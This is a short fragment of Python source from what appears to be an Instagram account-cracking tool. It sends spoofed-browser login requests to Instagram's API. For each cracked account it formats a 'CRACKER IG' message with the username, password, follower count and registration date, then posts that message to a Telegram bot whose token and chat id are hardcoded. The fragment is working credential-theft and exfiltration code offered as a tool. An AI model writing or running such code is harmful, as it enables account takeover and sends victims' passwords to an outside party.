...
def code_joo(userQ, password):
    ...
    head = {'HOST':'www.instagram.com',  'KeepAlive':'True', 
     'user-agent':'Opera/9.92 (Windows NT 6.1; sl-SI) Presto/2.8.242 Version/12.00', 
     'Cookie':cookie, 
     'Accept':'*/*', 
    ...
    Felo = f" -/ƝΞɰ CRACKER IG😛✔ \n[MY FB Fell Ing]  ʯʂɛʀ💠 : {username}\n ƤαȿȿøɰʀƊ✅ : {password}\n  userQ😗  : {userQ}\n [+] Ƒøɭɭøɰɛʀȿ :  {followes}\n Ɗαʈα ʀɛɢsʈʀ : {dat}\n BSA7TK BRO @Felling666"
    tlg = f"https://api.telegram.org/bot2015401377:AAF9EEMMVk65KNLppE-_IoM0dZFQX63JmwU/sendMessage?chat_id=1803859361&text=\n {Felo} \n"
    i = requests.post(tlg)


url = 'https://ii.instagram.com/api/v1/accounts/login/'
